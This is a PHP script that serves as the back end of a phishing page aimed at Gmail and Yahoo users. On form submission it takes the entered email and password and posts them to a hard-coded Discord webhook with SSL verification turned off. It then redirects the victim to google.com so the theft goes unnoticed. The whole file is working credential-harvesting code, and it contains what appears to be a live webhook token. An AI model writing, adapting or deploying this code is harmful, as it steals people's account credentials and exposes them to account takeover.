<?php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    $indexFile = 'index.html';
   
    if (file_exists($indexFile)) {
        readfile($indexFile);
    } else {
        echo "Error: The index.html file was not found.";
    }
    exit;
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = isset($_POST['username']) ? $_POST['username'] : 'No username provided';
    $password = isset($_POST['password']) ? $_POST['password'] : 'No password provided';

    if (!preg_match('/^[a-zA-Z0-9._%+-]+@(gmail\.com|yahoo\.com)$/', $username)) {
        echo "Invalid email. Please enter a valid Gmail or Yahoo address.";
        exit;
    }

    $domain = substr(strrchr($username, "@"), 1);
    if ($domain == 'gmail.com' || $domain == 'yahoo.com') {
        $webhook_url = 'https://discord.com/api/webhooks/1306201286118473758/oJ0rRrur0QwQ_0bP5hXEw_dA_OYAAOm8AmO1jvT0ec6kmdJYn1Jg0xcUrCFmtUil-W8k';

        $message = json_encode([
            "content" => "New login attempt",
            "embeds" => [
                [
                    "title" => "Login Details",
                    "fields" => [
                        [
                            "name" => "Username/Email",
                            "value" => $username,
                            "inline" => true
                        ],
                        [
                            "name" => "Password",
                            "value" => $password,
                            "inline" => true
                        ]
                    ]
                ]
            ]
        ]);

        $ch = curl_init($webhook_url);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $message);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);

     header('Location: https://google.com');
        exit;
    } else {
        echo "Email domain is not valid. Please enter a correct Gmail or Yahoo address.";
        exit;
    }
}
?>
